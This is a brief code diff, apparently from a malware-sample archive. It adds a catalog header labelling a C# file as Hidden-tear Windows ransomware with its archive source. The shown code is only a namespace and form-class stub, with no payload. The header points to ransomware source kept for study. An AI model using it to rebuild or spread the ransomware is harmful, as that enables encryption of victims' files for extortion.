@@ -1,3 +1,14 @@
+/*
+  name      Hidden-tear
+  type      ransomware
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 ﻿namespace hidden_tear
 {
     partial class Form1
